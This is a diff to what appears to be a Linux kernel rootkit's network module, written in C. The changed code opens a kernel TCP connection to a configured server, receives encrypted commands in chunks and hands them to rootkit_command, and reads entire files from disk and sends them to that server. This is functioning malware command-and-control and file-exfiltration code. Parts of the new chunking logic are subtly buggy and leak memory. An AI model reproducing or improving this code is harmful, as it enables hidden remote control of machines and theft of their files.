@@ -12,6 +12,7 @@ struct socket *sock = NULL;
 
 // Functions prototypes
 int close_socket(void);
+int send_to_server_raw(const char *data, size_t len);
 int send_to_server(char *message, ...);
 int network_worker(void *data);
 
@@ -46,20 +47,16 @@ int close_socket(void) {
  *         their meanings should be documented in the implementation.
  */
 int send_to_server(char *message, ...) {
-    struct kvec vec;
-    struct msghdr msg;
-    int ret_code;
     va_list args;
     char *formatted_message;
-    char *encrypted_msg = NULL;
-    size_t encrypted_len;
     int written;
+    int ret_code;
 
     if (!sock)
         return -EINVAL;
 
     // Retrieve all formatted message
-    formatted_message = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    formatted_message = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     if (!formatted_message)
         return -ENOMEM;
 
@@ -73,248 +70,475 @@ int send_to_server(char *message, ...) {
     }
 
     // Detect truncation
-    // Duno know if it still useful but it is here
     if (written >= STD_BUFFER_SIZE)
         pr_warn("send_to_server: message truncated\n");
 
-    // Cipherer message using AES
-    ret_code = encrypt_buffer(formatted_message, strlen(formatted_message), &encrypted_msg, &encrypted_len);
+    // Use send_to_server_raw to send the formatted message
+    ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
     kfree(formatted_message);
 
-    if (ret_code < 0) {
-        ERR_MSG("send_to_server: encryption failed\n");
-        return ret_code;
+    return ret_code;
+}
+
+int receive_from_server_raw(char *buffer, size_t max_len) {
+	char *received_buffer = kzalloc(max_len, GFP_KERNEL);
+    size_t total_received = 0;
+    size_t nb_chunks_needed = 0;
+    bool *received_chunks = NULL;
+    char *chunk_buffer = NULL;
+
+    // This loop waits for and receives the chunks of the message
+    while (total_received < max_len) {
+        // Allocate a buffer to receive a chunk (maximum size STD_BUFFER_SIZE)
+        chunk_buffer = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+        if (!chunk_buffer) {
+            ERR_MSG("receive_from_server_raw: failed to allocate chunk buffer\n");
+            return -ENOMEM;
+        }
+
+        struct kvec vec;
+        struct msghdr msg = { 0 };
+        vec.iov_base = chunk_buffer;
+        vec.iov_len = STD_BUFFER_SIZE;
+
+        int ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+        if (ret <= 0) {
+            ERR_MSG("receive_from_server_raw: failed to receive message (ret=%d)\n", ret);
+            kfree(chunk_buffer);
+            return -EIO;
+        }
+
+        // Extract information from the chunk
+        uint8_t total_chunks = chunk_buffer[0];                             // total number of chunks
+        uint8_t chunk_index = chunk_buffer[1];                              // index of the current chunk
+        uint16_t chunk_data_len = (chunk_buffer[2] << 8) | chunk_buffer[3]; // length of the chunk's data
+        uint8_t *chunk_data = (uint8_t *)(chunk_buffer + 4);                // chunk data
+
+        // Verify that the chunk has the correct end of transmission (0x04)
+        if (chunk_buffer[4 + chunk_data_len] != 0x04) {
+            ERR_MSG("receive_from_server_raw: invalid end of transmission (chunk %d)\n", chunk_index);
+            kfree(chunk_buffer);
+            return -EINVAL;
+        }
+
+        // If this is the first time receiving a message, initialize the received chunks array
+        if (nb_chunks_needed == 0) {
+            nb_chunks_needed = total_chunks;
+            received_chunks = kzalloc(nb_chunks_needed * sizeof(bool), GFP_KERNEL);
+            if (!received_chunks) {
+                ERR_MSG("receive_from_server_raw: failed to allocate received_chunks array\n");
+                kfree(chunk_buffer);
+                return -ENOMEM;
+            }
+        }
+
+        // Check that this chunk has not already been received
+        if (received_chunks[chunk_index]) {
+            ERR_MSG("receive_from_server_raw: duplicate chunk received (chunk %d)\n", chunk_index);
+            kfree(chunk_buffer);
+            return -EIO;
+        }
+
+        // Mark this chunk as received
+        received_chunks[chunk_index] = true;
+
+        // Copy the chunk's data into received_buffer
+        if (total_received + chunk_data_len > max_len) {
+            ERR_MSG("receive_from_server_raw: received data exceeds buffer size\n");
+            kfree(chunk_buffer);
+            kfree(received_chunks);
+            return -ENOMEM;
+        }
+
+        memcpy(received_buffer + total_received, chunk_data, chunk_data_len);
+        total_received += chunk_data_len;
+
+        // If all chunks have been received, we can finish receiving
+        bool all_received = true;
+        for (size_t i = 0; i < nb_chunks_needed; i++) {
+            if (!received_chunks[i]) {
+                all_received = false;
+                break;
+            }
+        }
+
+        if (all_received) {
+            // All chunks have been received, we can finish
+            break;
+        }
+
+        // Free the memory allocated for this chunk
+        kfree(chunk_buffer);
     }
 
-    // Prepare sending
-    vec.iov_base = encrypted_msg;
-    vec.iov_len = encrypted_len;
-    memset(&msg, 0, sizeof(msg));
-    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+    // Free the memory allocated for the received chunks array
+	if (chunk_buffer)
+		kfree(chunk_buffer);
+	kfree(received_chunks);
 
-    kfree(encrypted_msg);
+	// decrypt the received message
+	char *decrypted_buffer = NULL;
+	size_t decrypted_len;
+	if (decrypt_buffer(received_buffer, total_received, &decrypted_buffer, &decrypted_len) < 0) {
+		ERR_MSG("receive_from_server_raw: decryption failed\n");
+		kfree(received_buffer);
+		return -EIO;
+	}
+	if (decrypted_len >= max_len) {
+		decrypted_len = max_len - 1; // Prevent buffer overflow
+	}
+	memcpy(buffer, decrypted_buffer, decrypted_len);
+	buffer[decrypted_len] = '\0';
 
-    return ret_code < 0 ? ret_code : SUCCESS;
+	kfree(decrypted_buffer);
+	kfree(received_buffer);
+
+    return total_received;
 }
 
 int receive_from_server(char *recv_buffer, int buffer_size) {
-    struct kvec vec;
-    struct msghdr msg = { 0 };
-    char *encrypted_buf = NULL;
-    char *decrypted_buf = NULL;
-    size_t decrypted_len;
-    int ret;
+    return receive_from_server_raw(recv_buffer, buffer_size);
+}
 
-    if (!recv_buffer) {
-        ERR_MSG("receive_from_server: recv_buffer is NULL\n");
-        return -EINVAL;
+int send_to_server_raw(const char *data, size_t len) {
+    // Send data using socket
+    // data is sent using chunks of size STD_BUFFER_SIZE bytes
+    // a chunk is sent using the following protocol :
+    // - first byte: number of chunks that are going to be sent to send the full message data
+    // - second byte: index of this chunk
+    // - third + fourth byte : lenght of this chunk (max = STD_BUFFER_SIZE - 5)
+    // - fifth to last excluded byte: chunk data
+    // - last byte:  x04 == End Of Transmission
+
+    // Encrypt the message
+    char *encrypted_msg = NULL;
+    size_t encrypted_len;
+    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0) {
+        ERR_MSG("send_to_server_raw: encryption failed\n");
+        return -EIO;
     }
 
-    // memo: kzalloc == calloc
-    encrypted_buf = kzalloc(buffer_size, GFP_KERNEL);
-    if (!encrypted_buf)
-        return -ENOMEM;
+    // max chunk body size
+    size_t chunk_size = STD_BUFFER_SIZE;
+    size_t max_chunk_body_size = chunk_size - 5;
 
-    // Receive the message
-    vec.iov_base = encrypted_buf;
-    vec.iov_len = buffer_size;
+    // get the number of chunks needed to send the data
+    size_t nb_chunks_needed = len / max_chunk_body_size;
+    if (len % max_chunk_body_size != 0)
+        nb_chunks_needed++;
 
-    ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
-    if (ret < 0) {
-        ERR_MSG("receive_from_server: kernel_recvmsg failed: %d\n", ret);
-        kfree(encrypted_buf);
-        return FAILURE;
+    // main loop: send all chunks
+    for (size_t i = 0; i < nb_chunks_needed; i++) {
+        // Allocate the chunk buffer
+        char *chunk_buffer = kzalloc(chunk_size, GFP_KERNEL);
+        if (!chunk_buffer) {
+            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
+            return -ENOMEM;
+        }
+
+        // Calculate the actual chunk size for this iteration
+        size_t current_chunk_size = (i == nb_chunks_needed - 1) ? (encrypted_len % max_chunk_body_size) : max_chunk_body_size;
+        if (current_chunk_size == 0)
+            current_chunk_size = max_chunk_body_size; // If the last chunk is full size
+
+        // Fill the chunk buffer
+        chunk_buffer[0] = (uint8_t)nb_chunks_needed;                                             // number of chunks
+        chunk_buffer[1] = (uint8_t)i;                                                            // index of this chunk
+        chunk_buffer[2] = (current_chunk_size >> 8) & 0xFF;                                      // high byte of chunk data length
+        chunk_buffer[3] = current_chunk_size & 0xFF;                                             // low byte of chunk data length
+        memcpy(chunk_buffer + 4, encrypted_msg + (i * max_chunk_body_size), current_chunk_size); // chunk data
+        chunk_buffer[4 + current_chunk_size] = 0x04;                                             // End Of Transmission
+
+        // Send the chunk
+        struct kvec vec;
+        struct msghdr msg = { 0 };
+        vec.iov_base = chunk_buffer;
+        vec.iov_len = chunk_size;
+
+        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+        if (ret < 0) {
+            ERR_MSG("send_to_server_raw: failed to send message (chunk %zu)\n", i);
+            kfree(chunk_buffer);
+            return -FAILURE;
+        }
+
+        kfree(chunk_buffer);
     }
-
-    // Uncipherer message using AES
-    if (decrypt_buffer(encrypted_buf, ret, &decrypted_buf, &decrypted_len) < 0) {
-        ERR_MSG("receive_from_server: decryption failed\n");
-        kfree(encrypted_buf);
-        return FAILURE;
-    }
-
-    // Prevent buffer overflow
-    // Duno know how this can fix problems without creating others but it does
-    if (decrypted_len >= buffer_size)
-        decrypted_len = buffer_size - 1;
-
-    // Copy decrypted message to recv_buffer
-    memcpy(recv_buffer, decrypted_buf, decrypted_len);
-    recv_buffer[decrypted_len] = '\0';
-
-    kfree(encrypted_buf);
-    kfree(decrypted_buf);
 
     return SUCCESS;
 }
 
+// int receive_from_server(char *recv_buffer, int buffer_size) {
+//     struct kvec vec;
+//     struct msghdr msg = { 0 };
+//     char *encrypted_buf = NULL;
+//     char *decrypted_buf = NULL;
+//     size_t decrypted_len;
+//     int ret;
+
+//     if (!recv_buffer) {
+//         ERR_MSG("receive_from_server: recv_buffer is NULL\n");
+//         return -EINVAL;
+//     }
+
+//     // memo: kzalloc == calloc
+//     encrypted_buf = kzalloc(buffer_size, GFP_KERNEL);
+//     if (!encrypted_buf)
+//         return -ENOMEM;
+
+//     // Receive the message
+//     vec.iov_base = encrypted_buf;
+//     vec.iov_len = buffer_size;
+
+//     ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+//     if (ret < 0) {
+//         ERR_MSG("receive_from_server: kernel_recvmsg failed: %d\n", ret);
+//         kfree(encrypted_buf);
+//         return FAILURE;
+//     }
+
+//     // Uncipherer message using AES
+//     if (decrypt_buffer(encrypted_buf, ret, &decrypted_buf, &decrypted_len) < 0) {
+//         ERR_MSG("receive_from_server: decryption failed\n");
+//         kfree(encrypted_buf);
+//         return FAILURE;
+//     }
+
+//     // Prevent buffer overflow
+//     // Duno know how this can fix problems without creating others but it does
+//     if (decrypted_len >= buffer_size)
+//         decrypted_len = buffer_size - 1;
+
+//     // Copy decrypted message to recv_buffer
+//     memcpy(recv_buffer, decrypted_buf, decrypted_len);
+//     recv_buffer[decrypted_len] = '\0';
+
+//     kfree(encrypted_buf);
+//     kfree(decrypted_buf);
+
+//     return SUCCESS;
+// }
+
+// int send_to_server_raw(const char *data, size_t len) {
+// 	struct kvec vec;
+// 	struct msghdr msg;
+// 	char *encrypted_msg = NULL;
+// 	char *formatted_msg = NULL;
+// 	size_t encrypted_len;
+// 	int ret = 0;
+
+// 	if (!sock)
+// 		return -EINVAL;
+
+// 	// Compute size of formatted string: "[** BEGIN **]" + data + "[** END **]" + '\0'
+// 	const char *prefix = "[** BEGIN **]";
+// 	const char *suffix = "[** END **]";
+// 	size_t prefix_len = strlen(prefix);
+// 	size_t suffix_len = strlen(suffix);
+
+// 	formatted_msg = kzalloc(prefix_len + len + suffix_len + 1, GFP_KERNEL);
+// 	if (!formatted_msg) {
+// 		ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
+// 		return -ENOMEM;
+// 	}
+
+// 	memcpy(formatted_msg, prefix, prefix_len);
+// 	memcpy(formatted_msg + prefix_len, data, len);
+// 	memcpy(formatted_msg + prefix_len + len, suffix, suffix_len);
+// 	formatted_msg[prefix_len + len + suffix_len] = '\0';
+
+// 	DBG_MSG("send_to_server_raw: sending: %s\n", formatted_msg);
+
+// 	// Encrypt the message
+// 	if (encrypt_buffer(formatted_msg, prefix_len + len + suffix_len + 1, &encrypted_msg, &encrypted_len) < 0) {
+// 		ERR_MSG("send_to_server_raw: encryption failed\n");
+// 		kfree(formatted_msg);
+// 		return -EIO;
+// 	}
+
+// 	kfree(formatted_msg);
+
+// 	DBG_MSG("send_to_server_raw: sending encrypted message: %s\n", encrypted_msg);
+
+// 	// Send the entire encrypted message
+// 	vec.iov_base = encrypted_msg;
+// 	vec.iov_len = encrypted_len;
+// 	memset(&msg, 0, sizeof(msg));
+
+// 	ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+// 	if (ret < 0) {
+// 		ERR_MSG("send_to_server_raw: failed to send message\n");
+// 	}
+
+// 	kfree(encrypted_msg);
+// 	return ret < 0 ? ret : SUCCESS;
+// }
+
 int send_file_to_server(char *filename) {
     struct file *file = NULL;
     char *buffer = NULL;
-    loff_t pos = 0;
-    ssize_t read_size;
+    loff_t file_size, pos = 0;
     int ret_code = 0;
-
-    // Allocate buffer for chunks
-    buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!buffer) {
-        ERR_MSG("send_file_to_server: failed to allocate buffer\n");
-        return -ENOMEM;
-    }
-    memset(buffer, 0, STD_BUFFER_SIZE);
 
     // Open the file
     file = filp_open(filename, O_RDONLY, 0);
     if (IS_ERR(file)) {
         ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
-        kfree(buffer);
         return -ENOENT;
     }
 
-    // Read and send the file chunk by chunk
-    while ((read_size = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
-        struct kvec vec = {
-            .iov_base = buffer,
-            .iov_len = read_size
-        };
-        struct msghdr msg = { 0 };
-
-        ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-        if (ret_code < 0) {
-            ERR_MSG("send_file_to_server: failed to send chunk: %d\n", ret_code);
-            filp_close(file, NULL);
-            kfree(buffer);
-            return -FAILURE;
-        }
-        memset(buffer, 0, STD_BUFFER_SIZE);
+    // Get file size
+    file_size = i_size_read(file_inode(file));
+    if (file_size <= 0) {
+        ERR_MSG("send_file_to_server: invalid file size for %s\n", filename);
+        filp_close(file, NULL);
+        return -EINVAL;
     }
 
-    if (read_size < 0) {
-        ERR_MSG("send_file_to_server: failed to read file \"%s\" during send\n", filename);
-        ret_code = -FAILURE;
-    }
-    else {
-        DBG_MSG("send_file_to_server: file \"%s\" sent successfully\n", filename);
-        ret_code = SUCCESS;
+    // Allocate buffer for the entire file
+    buffer = kzalloc(file_size, GFP_KERNEL);
+    if (!buffer) {
+        ERR_MSG("send_file_to_server: failed to allocate buffer\n");
+        filp_close(file, NULL);
+        return -ENOMEM;
     }
 
-    // Cleanup
+    // Read the entire file into the buffer
+    if (kernel_read(file, buffer, file_size, &pos) != file_size) {
+        ERR_MSG("send_file_to_server: error reading file %s\n", filename);
+        ret_code = -EIO;
+        goto out;
+    }
+
+    DBG_MSG("send_file_to_server: sending file %s\n", filename);
+
+    // Send the entire file in one go
+    ret_code = send_to_server_raw(buffer, file_size);
+    if (ret_code < 0) {
+        ERR_MSG("send_file_to_server: failed to send file: %d\n", ret_code);
+        goto out;
+    }
+
+    DBG_MSG("send_file_to_server: file sent successfully\n");
+    ret_code = SUCCESS;
+
+out:
     filp_close(file, NULL);
     kfree(buffer);
-
     return ret_code;
 }
 
-/**
- * @brief Kernel thread function for managing network communication.
- *
- * @param data Pointer to thread-specific data (unused in this implementation).
- * @return int Returns SUCCESS on successful execution, or FAILURE on error.
- *
- * @note The thread will periodically retry operations such as connecting to the server
- *       or sending messages if they fail.
- */
-int network_worker(void *data) {
-    struct sockaddr_in addr = { 0 };
-    unsigned char ip_binary[4] = { 0 };
-    int ret_code = 0;
+static int connect_to_server(struct socket **sock, struct sockaddr_in *addr) {
+    int ret;
+    struct socket *s;
 
-    // Convert IP address string into 4-byte binary format
-    if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
-        ERR_MSG("network_worker: invalid IPv4\n");
+    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &s);
+    if (ret < 0) {
+        ERR_MSG("network_worker: socket creation failed: %d\n", ret);
         return -FAILURE;
     }
 
-    // Create a TCP socket in kernel space
-    ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-    if (ret_code < 0) {
-        ERR_MSG("network_worker: socket creation failed: %d\n", ret_code);
+    ret = s->ops->connect(s, (struct sockaddr *)addr, sizeof(*addr), 0);
+    if (ret < 0) {
+        ERR_MSG("network_worker: connection to server failed: %d\n", ret);
+        sock_release(s);
         return -FAILURE;
     }
 
-    // Prepare the sockaddr_in structure for the server we want to connect to
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
-    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
+    *sock = s;
+    return SUCCESS;
+}
 
-    // Attempt to connect to the remote server
-    // Retry periodically until the thread is stopped or the connection succeeds
+static bool send_initial_message_with_retries(void) {
+    for (int attempts = 0; attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR; attempts++) {
+        if (send_to_server(message) == SUCCESS)
+            return true;
+        msleep(TIMEOUT_BEFORE_RETRY);
+    }
+    return false;
+}
+
+static bool receive_loop(char *recv_buffer) {
+    unsigned failure_count = 0, empty_count = 0;
+
     while (!kthread_should_stop()) {
-        ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
-        if (ret_code < 0) {
-            ERR_MSG("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
+		// Clear the buffer before receiving
+		memset(recv_buffer, 0, RCV_CMD_BUFFER_SIZE);
+
+        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == -FAILURE) {
+            if (++failure_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
+                return false;
             msleep(TIMEOUT_BEFORE_RETRY);
             continue;
         }
 
-        // Connection successful
-        break;
-    }
-
-    // Attempt to send the initial message using send_to_server
-    int attempts = 0;
-    do {
-        ret_code = send_to_server(message);
-        if (ret_code != SUCCESS) {
-            ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
-            msleep(TIMEOUT_BEFORE_RETRY);
-            attempts++;
-        }
-    } while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
-
-    // If all attempts to send the message failed, abort
-    if (ret_code < 0) {
-        ERR_MSG("network_worker: failed to send message after 10 attempts, giving up.\n");
-        return -FAILURE;
-    }
-
-    DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
-
-    // Count of empty messages in a row received
-    // This is used to determine if the server is still active
-    // and to avoid flooding the server with empty messages
-    unsigned empty_count = 0;
-    // Listen for commands
-    // Retry until 'killcom' is received or thread is stopped by unmonting the module
-    char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
-    while (!kthread_should_stop() && !thread_exited) {
-        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == FAILURE) {
-            msleep(TIMEOUT_BEFORE_RETRY);
-            continue;
-        }
-
-        DBG_MSG("network_worker: received: %s", recv_buffer);
-
-        // Check if the received message is empty
         if (recv_buffer[0] == '\0') {
-            empty_count++;
-            if (empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR) {
-                ERR_MSG("network_worker: too many empty messages, exiting...\n");
-                break;
-            }
+            if (++empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
+                return false;
             continue;
         }
-        else {
-            empty_count = 0; // Reset the empty message count
-        }
+
+        failure_count = empty_count = 0;
+
+		// print the received message
+		DBG_MSG("network_worker: received message: %s\n", recv_buffer);
 
         if (strcmp(recv_buffer, "\n") != 0)
             rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
     }
 
-    // autodisconnect user when connexion is terminated
-    is_auth = false;
-    DBG_MSG("network_worker: connexion terminated, user disconnected\n");
+    return true;
+}
 
-    kfree(recv_buffer);
-    recv_buffer = NULL;
+int network_worker(void *data) {
+    char *recv_buffer = NULL;
+    struct sockaddr_in addr = { 0 };
+    unsigned char ip_binary[4] = { 0 };
 
-    if (restart_on_error)
-        network_worker(data);
+    if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
+        ERR_MSG("network_worker: invalid IPv4 address\n");
+        return -FAILURE;
+    }
 
-    // Final cleanup before thread exits
-    thread_exited = true;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
+
+    while (!kthread_should_stop()) {
+        close_socket();
+
+        if (connect_to_server(&sock, &addr) != SUCCESS) {
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
+
+        if (!send_initial_message_with_retries()) {
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
+
+        recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
+        if (!recv_buffer) {
+            ERR_MSG("network_worker: failed to allocate recv_buffer\n");
+            break;
+        }
+
+        if (!receive_loop(recv_buffer)) {
+            kfree(recv_buffer);
+            recv_buffer = NULL;
+			is_auth = false;
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
+
+        break;
+    }
+
+	if (recv_buffer)
+		kfree(recv_buffer);
+
     close_socket();
+    thread_exited = true;
 
     return SUCCESS;
 }
